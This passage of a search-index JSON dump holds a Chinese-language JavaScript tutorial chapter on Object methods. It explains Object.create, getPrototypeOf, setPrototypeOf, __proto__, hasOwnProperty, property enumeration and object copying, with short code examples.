\u547d\u4ee4\u8ba9\u6784\u9020\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u3002\u4f46\u662f\u5f88\u591a\u65f6\u5019\uff0c\u53ea\u80fd\u62ff\u5230\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5b83\u53ef\u80fd\u6839\u672c\u4e0d\u662f\u7531\u6784\u5efa\u51fd\u6570\u751f\u6210\u7684\uff0c\u90a3\u4e48\u80fd\u4e0d\u80fd\u4ece\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u751f\u6210\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u5462\uff1f JavaScript \u63d0\u4f9b\u4e86 Object.create() \u65b9\u6cd5\uff0c\u7528\u6765\u6ee1\u8db3\u8fd9\u79cd\u9700\u6c42\u3002\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u7136\u540e\u4ee5\u5b83\u4e3a\u539f\u578b\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u8be5\u5b9e\u4f8b\u5b8c\u5168\u7ee7\u627f\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u539f\u578b\u5bf9\u8c61 var A = { print : function () { console . log ( 'hello' ); } }; // \u5b9e\u4f8b\u5bf9\u8c61 var B = Object . create ( A ); Object . getPrototypeOf ( B ) === A // true B . print () // hello B . print === A . print // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.create() \u65b9\u6cd5\u4ee5 A \u5bf9\u8c61\u4e3a\u539f\u578b\uff0c\u751f\u6210\u4e86 B \u5bf9\u8c61\u3002 B \u7ee7\u627f\u4e86 A \u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u5b9e\u9645\u4e0a\uff0c Object.create() \u65b9\u6cd5\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u4ee3\u66ff\u3002 1 2 3 4 5 6 7 if ( typeof Object . create !== 'function' ) { Object . create = function ( obj ) { function F () {} F . prototype = obj ; return new F (); }; } \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c Object.create() \u65b9\u6cd5\u7684\u5b9e\u8d28\u662f\u65b0\u5efa\u4e00\u4e2a\u7a7a\u7684\u6784\u9020\u51fd\u6570 F \uff0c\u7136\u540e\u8ba9 F.prototype \u5c5e\u6027\u6307\u5411\u53c2\u6570\u5bf9\u8c61 obj \uff0c\u6700\u540e\u8fd4\u56de\u4e00\u4e2a F \u7684\u5b9e\u4f8b\uff0c\u4ece\u800c\u5b9e\u73b0\u8ba9\u8be5\u5b9e\u4f8b\u7ee7\u627f obj \u7684\u5c5e\u6027\u3002 \u4e0b\u9762\u4e09\u79cd\u65b9\u5f0f\u751f\u6210\u7684\u65b0\u5bf9\u8c61\u662f\u7b49\u4ef7\u7684\u3002 1 2 3 var obj1 = Object . create ({}); var obj2 = Object . create ( Object . prototype ); var obj3 = new Object (); \u5982\u679c\u60f3\u8981\u751f\u6210\u4e00\u4e2a\u4e0d\u7ee7\u627f\u4efb\u4f55\u5c5e\u6027\uff08\u6bd4\u5982\u6ca1\u6709 toString() \u548c valueOf() \u65b9\u6cd5\uff09\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5c06 Object.create() \u7684\u53c2\u6570\u8bbe\u4e3a null \u3002 1 2 3 4 var obj = Object . create ( null ); obj . valueOf () // TypeError: Object [object Object] has no method 'valueOf' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684\u539f\u578b\u662f null \uff0c\u5b83\u5c31\u4e0d\u5177\u5907\u4e00\u4e9b\u5b9a\u4e49\u5728 Object.prototype \u5bf9\u8c61\u4e0a\u9762\u7684\u5c5e\u6027\uff0c\u6bd4\u5982 valueOf() \u65b9\u6cd5\u3002 \u4f7f\u7528 Object.create() \u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u63d0\u4f9b\u5bf9\u8c61\u539f\u578b\uff0c\u5373\u53c2\u6570\u4e0d\u80fd\u4e3a\u7a7a\uff0c\u6216\u8005\u4e0d\u662f\u5bf9\u8c61\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 1 2 3 4 Object . create () // TypeError: Object prototype may only be an Object or null Object . create ( 123 ) // TypeError: Object prototype may only be an Object or null Object.create() \u65b9\u6cd5\u751f\u6210\u7684\u65b0\u5bf9\u8c61\uff0c\u52a8\u6001\u7ee7\u627f\u4e86\u539f\u578b\u3002\u5728\u539f\u578b\u4e0a\u6dfb\u52a0\u6216\u4fee\u6539\u4efb\u4f55\u65b9\u6cd5\uff0c\u4f1a\u7acb\u523b\u53cd\u6620\u5728\u65b0\u5bf9\u8c61\u4e4b\u4e0a\u3002 1 2 3 4 5 var obj1 = { p : 1 }; var obj2 = Object . create ( obj1 ); obj1 . p = 2 ; obj2 . p // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4fee\u6539\u5bf9\u8c61\u539f\u578b obj1 \u4f1a\u5f71\u54cd\u5230\u5b9e\u4f8b\u5bf9\u8c61 obj2 \u3002 \u9664\u4e86\u5bf9\u8c61\u7684\u539f\u578b\uff0c Object.create() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002\u8be5\u53c2\u6570\u662f\u4e00\u4e2a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b83\u6240\u63cf\u8ff0\u7684\u5bf9\u8c61\u5c5e\u6027\uff0c\u4f1a\u6dfb\u52a0\u5230\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u8be5\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var obj = Object . create ({}, { p1 : { value : 123 , enumerable : true , configurable : true , writable : true , }, p2 : { value : 'abc' , enumerable : true , configurable : true , writable : true , } }); // \u7b49\u540c\u4e8e var obj = Object . create ({}); obj . p1 = 123 ; obj . p2 = 'abc' ; Object.create() \u65b9\u6cd5\u751f\u6210\u7684\u5bf9\u8c61\uff0c\u7ee7\u627f\u4e86\u5b83\u7684\u539f\u578b\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 function A () {} var a = new A (); var b = Object . create ( a ); b . constructor === A // true b instanceof A // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c b \u5bf9\u8c61\u7684\u539f\u578b\u662f a \u5bf9\u8c61\uff0c\u56e0\u6b64\u7ee7\u627f\u4e86 a \u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570 A \u3002 Object.prototype.isPrototypeOf() \u00b6 \u5b9e\u4f8b\u5bf9\u8c61\u7684 isPrototypeOf \u65b9\u6cd5\uff0c\u7528\u6765\u5224\u65ad\u8be5\u5bf9\u8c61\u662f\u5426\u4e3a\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b\u3002 1 2 3 4 5 6 var o1 = {}; var o2 = Object . create ( o1 ); var o3 = Object . create ( o2 ); o2 . isPrototypeOf ( o3 ) // true o1 . isPrototypeOf ( o3 ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c o1 \u548c o2 \u90fd\u662f o3 \u7684\u539f\u578b\u3002\u8fd9\u8868\u660e\u53ea\u8981\u5b9e\u4f8b\u5bf9\u8c61\u5904\u5728\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u4e0a\uff0c isPrototypeOf \u65b9\u6cd5\u90fd\u8fd4\u56de true \u3002 1 2 3 4 Object . prototype . isPrototypeOf ({}) // true Object . prototype . isPrototypeOf ([]) // true Object . prototype . isPrototypeOf ( /xyz/ ) // true Object . prototype . isPrototypeOf ( Object . create ( null )) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e Object.prototype \u5904\u4e8e\u539f\u578b\u94fe\u7684\u6700\u9876\u7aef\uff0c\u6240\u4ee5\u5bf9\u5404\u79cd\u5b9e\u4f8b\u90fd\u8fd4\u56de true \uff0c\u53ea\u6709\u76f4\u63a5\u7ee7\u627f\u81ea null \u7684\u5bf9\u8c61\u9664\u5916\u3002 Object.prototype.__proto__ \u00b6 \u5b9e\u4f8b\u5bf9\u8c61\u7684 __proto__ \u5c5e\u6027\uff08\u524d\u540e\u5404\u4e24\u4e2a\u4e0b\u5212\u7ebf\uff09\uff0c\u8fd4\u56de\u8be5\u5bf9\u8c61\u7684\u539f\u578b\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 1 2 3 4 5 var obj = {}; var p = {}; obj . __proto__ = p ; Object . getPrototypeOf ( obj ) === p // true \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7 __proto__ \u5c5e\u6027\uff0c\u5c06 p \u5bf9\u8c61\u8bbe\u4e3a obj \u5bf9\u8c61\u7684\u539f\u578b\u3002 \u6839\u636e\u8bed\u8a00\u6807\u51c6\uff0c __proto__ \u5c5e\u6027\u53ea\u6709\u6d4f\u89c8\u5668\u624d\u9700\u8981\u90e8\u7f72\uff0c\u5176\u4ed6\u73af\u5883\u53ef\u4ee5\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\u3002\u5b83\u524d\u540e\u7684\u4e24\u6839\u4e0b\u5212\u7ebf\uff0c\u8868\u660e\u5b83\u672c\u8d28\u662f\u4e00\u4e2a\u5185\u90e8\u5c5e\u6027\uff0c\u4e0d\u5e94\u8be5\u5bf9\u4f7f\u7528\u8005\u66b4\u9732\u3002\u56e0\u6b64\uff0c\u5e94\u8be5\u5c3d\u91cf\u5c11\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u800c\u662f\u7528 Object.getPrototypeOf() \u548c Object.setPrototypeOf() \uff0c\u8fdb\u884c\u539f\u578b\u5bf9\u8c61\u7684\u8bfb\u5199\u64cd\u4f5c\u3002 \u539f\u578b\u94fe\u53ef\u4ee5\u7528 __proto__ \u5f88\u76f4\u89c2\u5730\u8868\u793a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 var A = { name : '\u5f20\u4e09' }; var B = { name : '\u674e\u56db' }; var proto = { print : function () { console . log ( this . name ); } }; A . __proto__ = proto ; B . __proto__ = proto ; A . print () // \u5f20\u4e09 B . print () // \u674e\u56db A . print === B . print // true A . print === proto . print // true B . print === proto . print // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c A \u5bf9\u8c61\u548c B \u5bf9\u8c61\u7684\u539f\u578b\u90fd\u662f proto \u5bf9\u8c61\uff0c\u5b83\u4eec\u90fd\u5171\u4eab proto \u5bf9\u8c61\u7684 print \u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c A \u548c B \u7684 print \u65b9\u6cd5\uff0c\u90fd\u662f\u5728\u8c03\u7528 proto \u5bf9\u8c61\u7684 print \u65b9\u6cd5\u3002 \u83b7\u53d6\u539f\u578b\u5bf9\u8c61\u65b9\u6cd5\u7684\u6bd4\u8f83 \u00b6 \u5982\u524d\u6240\u8ff0\uff0c __proto__ \u5c5e\u6027\u6307\u5411\u5f53\u524d\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61\uff0c\u5373\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\u3002 1 2 3 4 5 6 var obj = new Object (); obj . __proto__ === Object . prototype // true obj . __proto__ === obj . constructor . prototype // true \u4e0a\u9762\u4ee3\u7801\u9996\u5148\u65b0\u5efa\u4e86\u4e00\u4e2a\u5bf9\u8c61 obj \uff0c\u5b83\u7684 __proto__ \u5c5e\u6027\uff0c\u6307\u5411\u6784\u9020\u51fd\u6570\uff08 Object \u6216 obj.constructor \uff09\u7684 prototype \u5c5e\u6027\u3002 \u56e0\u6b64\uff0c\u83b7\u53d6\u5b9e\u4f8b\u5bf9\u8c61 obj \u7684\u539f\u578b\u5bf9\u8c61\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\u3002 obj.__proto__ obj.constructor.prototype Object.getPrototypeOf(obj) \u4e0a\u9762\u4e09\u79cd\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u524d\u4e24\u79cd\u90fd\u4e0d\u662f\u5f88\u53ef\u9760\u3002 __proto__ \u5c5e\u6027\u53ea\u6709\u6d4f\u89c8\u5668\u624d\u9700\u8981\u90e8\u7f72\uff0c\u5176\u4ed6\u73af\u5883\u53ef\u4ee5\u4e0d\u90e8\u7f72\u3002\u800c obj.constructor.prototype \u5728\u624b\u52a8\u6539\u53d8\u539f\u578b\u5bf9\u8c61\u65f6\uff0c\u53ef\u80fd\u4f1a\u5931\u6548\u3002 1 2 3 4 5 6 7 8 var P = function () {}; var p = new P (); var C = function () {}; C . prototype = p ; var c = new C (); c . constructor . prototype === p // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 C \u7684\u539f\u578b\u5bf9\u8c61\u88ab\u6539\u6210\u4e86 p \uff0c\u4f46\u662f\u5b9e\u4f8b\u5bf9\u8c61\u7684 c.constructor.prototype \u5374\u6ca1\u6709\u6307\u5411 p \u3002\u6240\u4ee5\uff0c\u5728\u6539\u53d8\u539f\u578b\u5bf9\u8c61\u65f6\uff0c\u4e00\u822c\u8981\u540c\u65f6\u8bbe\u7f6e constructor \u5c5e\u6027\u3002 1 2 3 4 5 C . prototype = p ; C . prototype . constructor = C ; var c = new C (); c . constructor . prototype === p // true \u56e0\u6b64\uff0c\u63a8\u8350\u4f7f\u7528\u7b2c\u4e09\u79cd Object.getPrototypeOf \u65b9\u6cd5\uff0c\u83b7\u53d6\u539f\u578b\u5bf9\u8c61\u3002 Object.getOwnPropertyNames() \u00b6 Object.getOwnPropertyNames \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u53c2\u6570\u5bf9\u8c61\u672c\u8eab\u7684\u6240\u6709\u5c5e\u6027\u7684\u952e\u540d\uff0c\u4e0d\u5305\u542b\u7ee7\u627f\u7684\u5c5e\u6027\u952e\u540d\u3002 1 2 Object . getOwnPropertyNames ( Date ) // [\"parse\", \"arguments\", \"UTC\", \"caller\", \"name\", \"prototype\", \"now\", \"length\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.getOwnPropertyNames \u65b9\u6cd5\u8fd4\u56de Date \u6240\u6709\u81ea\u8eab\u7684\u5c5e\u6027\u540d\u3002 \u5bf9\u8c61\u672c\u8eab\u7684\u5c5e\u6027\u4e4b\u4e2d\uff0c\u6709\u7684\u662f\u53ef\u4ee5\u904d\u5386\u7684\uff08enumerable\uff09\uff0c\u6709\u7684\u662f\u4e0d\u53ef\u4ee5\u904d\u5386\u7684\u3002 Object.getOwnPropertyNames \u65b9\u6cd5\u8fd4\u56de\u6240\u6709\u952e\u540d\uff0c\u4e0d\u7ba1\u662f\u5426\u53ef\u4ee5\u904d\u5386\u3002\u53ea\u83b7\u53d6\u90a3\u4e9b\u53ef\u4ee5\u904d\u5386\u7684\u5c5e\u6027\uff0c\u4f7f\u7528 Object.keys \u65b9\u6cd5\u3002 1 Object . keys ( Date ) // [] \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c Date \u5bf9\u8c61\u6240\u6709\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u90fd\u662f\u4e0d\u53ef\u4ee5\u904d\u5386\u7684\u3002 Object.prototype.hasOwnProperty() \u00b6 \u5bf9\u8c61\u5b9e\u4f8b\u7684 hasOwnProperty \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u7528\u4e8e\u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u5b9a\u4e49\u5728\u5bf9\u8c61\u81ea\u8eab\uff0c\u8fd8\u662f\u5b9a\u4e49\u5728\u539f\u578b\u94fe\u4e0a\u3002 1 2 Date . hasOwnProperty ( 'length' ) // true Date . hasOwnProperty ( 'toString' ) // false \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c Date.length \uff08\u6784\u9020\u51fd\u6570 Date \u53ef\u4ee5\u63a5\u53d7\u591a\u5c11\u4e2a\u53c2\u6570\uff09\u662f Date \u81ea\u8eab\u7684\u5c5e\u6027\uff0c Date.toString \u662f\u7ee7\u627f\u7684\u5c5e\u6027\u3002 \u53e6\u5916\uff0c hasOwnProperty \u65b9\u6cd5\u662f JavaScript \u4e4b\u4e2d\u552f\u4e00\u4e00\u4e2a\u5904\u7406\u5bf9\u8c61\u5c5e\u6027\u65f6\uff0c\u4e0d\u4f1a\u904d\u5386\u539f\u578b\u94fe\u7684\u65b9\u6cd5\u3002 in \u8fd0\u7b97\u7b26\u548c for...in \u5faa\u73af \u00b6 in \u8fd0\u7b97\u7b26\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u5177\u6709\u67d0\u4e2a\u5c5e\u6027\u3002\u5b83\u4e0d\u533a\u5206\u8be5\u5c5e\u6027\u662f\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd8\u662f\u7ee7\u627f\u7684\u5c5e\u6027\u3002 1 2 'length' in Date // true 'toString' in Date // true in \u8fd0\u7b97\u7b26\u5e38\u7528\u4e8e\u68c0\u67e5\u4e00\u4e2a\u5c5e\u6027\u662f\u5426\u5b58\u5728\u3002 \u83b7\u5f97\u5bf9\u8c61\u7684\u6240\u6709\u53ef\u904d\u5386\u5c5e\u6027\uff08\u4e0d\u7ba1\u662f\u81ea\u8eab\u7684\u8fd8\u662f\u7ee7\u627f\u7684\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 for...in \u5faa\u73af\u3002 1 2 3 4 5 6 7 8 9 10 11 var o1 = { p1 : 123 }; var o2 = Object . create ( o1 , { p2 : { value : \"abc\" , enumerable : true } }); for ( p in o2 ) { console . info ( p ); } // p2 // p1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 o2 \u7684 p2 \u5c5e\u6027\u662f\u81ea\u8eab\u7684\uff0c p1 \u5c5e\u6027\u662f\u7ee7\u627f\u7684\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\u3002 \u4e3a\u4e86\u5728 for...in \u5faa\u73af\u4e2d\u83b7\u5f97\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u53ef\u4ee5\u91c7\u7528 hasOwnProperty \u65b9\u6cd5\u5224\u65ad\u4e00\u4e0b\u3002 1 2 3 4 5 for ( var name in object ) { if ( object . hasOwnProperty ( name ) ) { /* loop code */ } } \u83b7\u5f97\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff08\u4e0d\u7ba1\u662f\u81ea\u8eab\u7684\u8fd8\u662f\u7ee7\u627f\u7684\uff0c\u4e5f\u4e0d\u7ba1\u662f\u5426\u53ef\u679a\u4e3e\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 function inheritedPropertyNames ( obj ) { var props = {}; while ( obj ) { Object . getOwnPropertyNames ( obj ). forEach ( function ( p ) { props [ p ] = true ; }); obj = Object . getPrototypeOf ( obj ); } return Object . getOwnPropertyNames ( props ); } \u4e0a\u9762\u4ee3\u7801\u4f9d\u6b21\u83b7\u53d6 obj \u5bf9\u8c61\u7684\u6bcf\u4e00\u7ea7\u539f\u578b\u5bf9\u8c61\u201c\u81ea\u8eab\u201d\u7684\u5c5e\u6027\uff0c\u4ece\u800c\u83b7\u53d6 obj \u5bf9\u8c61\u7684\u201c\u6240\u6709\u201d\u5c5e\u6027\uff0c\u4e0d\u7ba1\u662f\u5426\u53ef\u904d\u5386\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5217\u51fa Date \u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 inheritedPropertyNames ( Date ) // [ // \"caller\", // \"constructor\", // \"toString\", // \"UTC\", // ... // ] \u5bf9\u8c61\u7684\u62f7\u8d1d \u00b6 \u5982\u679c\u8981\u62f7\u8d1d\u4e00\u4e2a\u5bf9\u8c61\uff0c\u9700\u8981\u505a\u5230\u4e0b\u9762\u4e24\u4ef6\u4e8b\u60c5\u3002 \u786e\u4fdd\u62f7\u8d1d\u540e\u7684\u5bf9\u8c61\uff0c\u4e0e\u539f\u5bf9\u8c61\u5177\u6709\u540c\u6837\u7684\u539f\u578b\u3002 \u786e\u4fdd\u62f7\u8d1d\u540e\u7684\u5bf9\u8c61\uff0c\u4e0e\u539f\u5bf9\u8c61\u5177\u6709\u540c\u6837\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 \u4e0b\u9762\u5c31\u662f\u6839\u636e\u4e0a\u9762\u4e24\u70b9\uff0c\u5b9e\u73b0\u7684\u5bf9\u8c61\u62f7\u8d1d\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function copyObject ( orig ) { var copy = Object . create ( Object . getPrototypeOf ( orig )); copyOwnPropertiesFrom ( copy , orig ); return copy ; } function copyOwnPropertiesFrom ( target , source ) { Object . getOwnPropertyNames ( source ) . forEach ( function ( propKey ) { var desc = Object . getOwnPropertyDescriptor ( source , propKey ); Object . defineProperty ( target , propKey , desc ); }); return target ; } \u53e6\u4e00\u79cd\u66f4\u7b80\u5355\u7684\u5199\u6cd5\uff0c\u662f\u5229\u7528 ES2017 \u624d\u5f15\u5165\u6807\u51c6\u7684 Object.getOwnPropertyDescriptors \u65b9\u6cd5\u3002 1 2 3 4 5 6 function copyObject ( orig ) { return Object . create ( Object . getPrototypeOf ( orig ), Object . getOwnPropertyDescriptors ( orig ) ); } \u53c2\u8003\u94fe\u63a5 \u00b6 Dr. Axel Rauschmayer, JavaScript properties: inheritance and enumerability","title":"Object \u5bf9\u8c61\u7684\u76f8\u5173\u65b9\u6cd5"},{"location":"oop/object/#object","text":"JavaScript \u5728 Object \u5bf9\u8c61\u4e0a\u9762\uff0c\u63d0\u4f9b\u4e86\u5f88\u591a\u76f8\u5173\u65b9\u6cd5\uff0c\u5904\u7406\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u76f8\u5173\u64cd\u4f5c\u3002\u672c\u7ae0\u4ecb\u7ecd\u8fd9\u4e9b\u65b9\u6cd5\u3002","title":"Object \u5bf9\u8c61\u7684\u76f8\u5173\u65b9\u6cd5"},{"location":"oop/object/#objectgetprototypeof","text":"Object.getPrototypeOf \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b\u3002\u8fd9\u662f\u83b7\u53d6\u539f\u578b\u5bf9\u8c61\u7684\u6807\u51c6\u65b9\u6cd5\u3002 1 2 3 var F = function () {}; var f = new F (); Object . getPrototypeOf ( f ) === F . prototype // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 f \u7684\u539f\u578b\u662f F.prototype \u3002 \u4e0b\u9762\u662f\u51e0\u79cd\u7279\u6b8a\u5bf9\u8c61\u7684\u539f\u578b\u3002 1 2 3 4 5 6 7 8 9 // \u7a7a\u5bf9\u8c61\u7684\u539f\u578b\u662f Object.prototype Object . getPrototypeOf ({}) === Object . prototype // true // Object.prototype \u7684\u539f\u578b\u662f null Object . getPrototypeOf ( Object . prototype ) === null // true // \u51fd\u6570\u7684\u539f\u578b\u662f Function.prototype function f () {} Object . getPrototypeOf ( f ) === Function . prototype // true","title":"Object.getPrototypeOf()"},{"location":"oop/object/#objectsetprototypeof","text":"Object.setPrototypeOf \u65b9\u6cd5\u4e3a\u53c2\u6570\u5bf9\u8c61\u8bbe\u7f6e\u539f\u578b\uff0c\u8fd4\u56de\u8be5\u53c2\u6570\u5bf9\u8c61\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u73b0\u6709\u5bf9\u8c61\uff0c\u7b2c\u4e8c\u4e2a\u662f\u539f\u578b\u5bf9\u8c61\u3002 1 2 3 4 5 6 var a = {}; var b = { x : 1 }; Object . setPrototypeOf ( a , b ); Object . getPrototypeOf ( a ) === b // true a . x // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.setPrototypeOf \u65b9\u6cd5\u5c06\u5bf9\u8c61 a \u7684\u539f\u578b\uff0c\u8bbe\u7f6e\u4e3a\u5bf9\u8c61 b \uff0c\u56e0\u6b64 a \u53ef\u4ee5\u5171\u4eab b \u7684\u5c5e\u6027\u3002 new \u547d\u4ee4\u53ef\u4ee5\u4f7f\u7528 Object.setPrototypeOf \u65b9\u6cd5\u6a21\u62df\u3002 1 2 3 4 5 6 7 8 var F = function () { this . foo = 'bar' ; }; var f = new F (); // \u7b49\u540c\u4e8e var f = Object . setPrototypeOf ({}, F . prototype ); F . call ( f ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c new \u547d\u4ee4\u65b0\u5efa\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5176\u5b9e\u53ef\u4ee5\u5206\u6210\u4e24\u6b65\u3002\u7b2c\u4e00\u6b65\uff0c\u5c06\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u7684\u539f\u578b\u8bbe\u4e3a\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\uff08\u4e0a\u4f8b\u662f F.prototype \uff09\uff1b\u7b2c\u4e8c\u6b65\uff0c\u5c06\u6784\u9020\u51fd\u6570\u5185\u90e8\u7684 this \u7ed1\u5b9a\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u7136\u540e\u6267\u884c\u6784\u9020\u51fd\u6570\uff0c\u4f7f\u5f97\u5b9a\u4e49\u5728 this \u4e0a\u9762\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\uff08\u4e0a\u4f8b\u662f this.foo \uff09\uff0c\u90fd\u8f6c\u79fb\u5230\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u4e0a\u3002","title":"Object.setPrototypeOf()"},{"location":"oop/object/#objectcreate","text":"\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5e38\u7528\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528 new \u547d\u4ee4\u8ba9\u6784\u9020\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u3002\u4f46\u662f\u5f88\u591a\u65f6\u5019\uff0c\u53ea\u80fd\u62ff\u5230\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5b83\u53ef\u80fd\u6839\u672c\u4e0d\u662f\u7531\u6784\u5efa\u51fd\u6570\u751f\u6210\u7684\uff0c\u90a3\u4e48\u80fd\u4e0d\u80fd\u4ece\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u751f\u6210\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u5462\uff1f JavaScript \u63d0\u4f9b\u4e86 Object.create() \u65b9\u6cd5\uff0c\u7528\u6765\u6ee1\u8db3\u8fd9\u79cd\u9700\u6c42\u3002\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u7136\u540e\u4ee5\u5b83\u4e3a\u539f\u578b\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u8be5\u5b9e\u4f8b\u5b8c\u5168\u7ee7\u627f\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u539f\u578b\u5bf9\u8c61 var A = { print : function () { console . log ( 'hello' ); } }; // \u5b9e\u4f8b\u5bf9\u8c61 var B = Object . create ( A ); Object . getPrototypeOf ( B ) === A // true B . print () // hello B . print === A . print // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.create() \u65b9\u6cd5\u4ee5 A \u5bf9\u8c61\u4e3a\u539f\u578b\uff0c\u751f\u6210\u4e86 B \u5bf9\u8c61\u3002 B \u7ee7\u627f\u4e86 A \u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u5b9e\u9645\u4e0a\uff0c Object.create() \u65b9\u6cd5\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u4ee3\u66ff\u3002 1 2 3 4 5 6 7 if ( typeof Object . create !== 'function' ) { Object . create = function ( obj ) { function F () {} F . prototype = obj ; return new F (); }; } \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c Object.create() \u65b9\u6cd5\u7684\u5b9e\u8d28\u662f\u65b0\u5efa\u4e00\u4e2a\u7a7a\u7684\u6784\u9020\u51fd\u6570 F \uff0c\u7136\u540e\u8ba9 F.prototype \u5c5e\u6027\u6307\u5411\u53c2\u6570\u5bf9\u8c61 obj \uff0c\u6700\u540e\u8fd4\u56de\u4e00\u4e2a F \u7684\u5b9e\u4f8b\uff0c\u4ece\u800c\u5b9e\u73b0\u8ba9\u8be5\u5b9e\u4f8b\u7ee7\u627f obj \u7684\u5c5e\u6027\u3002 